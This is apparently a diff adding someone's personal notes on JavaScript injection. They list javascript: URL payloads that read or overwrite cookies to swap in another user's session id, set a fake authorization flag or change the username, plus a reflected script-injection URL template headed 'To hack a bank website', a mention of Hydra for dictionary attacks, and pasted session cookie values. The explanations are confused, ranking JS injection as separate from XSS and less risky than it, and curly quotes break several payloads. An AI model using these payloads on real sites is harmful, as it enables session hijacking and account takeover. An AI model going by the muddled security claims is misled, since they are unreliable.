@@ -1,0 +1,28 @@
+To inject JavaScript;
+
+In the URL javascript:alert("asdfom");
+javascript cookie info
+javascript:alert(document.cookie);
+javascript:void(document.cookie=“session_id=<<other session id>>“); // To change the session_id
+javascript:void(document.cookie=“authorization=true“); //To enable the cookie settings
+confirm("are u sure?"); //Ok means true and Cancel means false
+prompt("This is an Prompt Dialog", "Please Provide a Response..."); //Response can be get from the user
+javascript:void(document.cookie=”username=otherUser”); //To change the username
+Hydra is a popular tool that is widely used for dictionary attacks. 
+To hack a bank website
+
+https://yourBankWebsite.com/account?id=<script>[maliciousCodeHere]</script>
+
+p5AccountId2266=1023201917391182912309948965; 
+_ga=GA1.2.1478805372.1571832555; 
+_fbp=fb.1.1571832558179.334065321
+p5PrevTime2266=2019/10/23%2017%3A39%3A48; 
+p5SessionId2266=201910231748959395503948867
+
+Points:
+JS injection is not as risky as SQL injection or XSS injection(need to know what it is)
+parameters modification is considered as a riskier one than design modification.
+
+
+my session id = 201910231748959395503948867;
+https://www.youtube.com/watch?v=s8Kt1upvcJ8
